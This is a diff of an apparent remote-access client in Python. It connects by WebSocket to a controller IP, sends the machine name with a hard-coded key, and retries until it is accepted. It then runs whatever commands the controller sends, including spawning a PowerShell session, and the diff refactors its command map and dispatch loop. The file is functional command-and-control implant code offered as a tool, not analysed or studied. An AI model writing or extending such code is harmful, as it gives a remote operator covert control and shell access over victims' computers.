@@ -6,23 +6,26 @@ import subprocess
 from websocket import WebSocket
 from platform import node
 
-op = os.path
-funcMap = {}
-# CREATE A FUNCTION MAP FOR COMMANDS AND FUNCTIONS, MAKE A FUNCTION TO ADD FUNCTIONS EASILY TO THE MAP
-def addToFunctionMap(CMDname, desc, callback):
-    global funcMap
-    funcMap[CMDname] = [desc, callback]
+specialCommands = []
 
-def getAllCommands(websocket):
+op = os.path
+MACHINENAME = node()
+funcMap = {} # Desc, callback
+
+def addToFunctionMap(CMDname, callback):
+    global funcMap
+    funcMap[CMDname] = [[callback.__code__.co_varnames[:callback.__code__.co_argcount]], callback]
+
+def cmds(websocket):
     for cmd in funcMap:
-        websocket.send(f"{cmd}: {cmd[0]}")
+        websocket.send(f"{cmd}: {funcMap[cmd][0]}") # have to get argument count and argument names if possible
     endOfTransmission(websocket)
 
 # Connect to controller
 def connect(ip):
     ws = WebSocket()
     ws.connect(f"ws://{ip}:8765")
-    ws.send(f"CONNECT: {node()} KEY: OmG") # Include machine name and a key
+    ws.send(f"CONNECT: {MACHINENAME} KEY: OmG") # Include machine name and a key
     res = ws.recv()
     # Retry every few mins instead of quitting
     if res == "SUCCESS":
@@ -121,6 +124,9 @@ def spawnPowerShell(websocket):
 def endOfTransmission(websocket):
     websocket.send("\n\n\n\n\nEND")
 
+def goofyGoober(ye1, ye2):
+    print(ye1, ye2)
+
 # Get all functions
 funcs = [f for f in globals().values() if callable(f)]
 for f in funcs:
@@ -133,14 +139,20 @@ while not ws:
     sleep(10)
 
 while True:
-    res = ws.recv()
-    print("Received:", res)
-    if res == "cmds":
-        getAllCommands(ws)
-    elif res in funcMap:
-        s = res.split(">")[0].split()
-        print(s[0], s[1:])
-        funcMap[s[0]](s[1:])
+    ws.send(f"<MCHNNAME: {MACHINENAME}>")
+    res = ws.recv().split(">")[1].strip() # Try statement here to handle disconnections
+     
+    context = res.split()
+    cmd = context[0]
+    args = context[1:]
+    
+    if not cmd in specialCommands:
+        func = funcMap[cmd][1]
+        funcArgs = func.__code__.co_varnames[:func.__code__.co_argcount] # return tuple, can you index a tuple?
+        if funcArgs[0] == "websocket":       
+            func(ws, *args) # might not work
+        else:
+            func(*args)
     else:
         ws.send("Command does not exist!")
         endOfTransmission(ws)
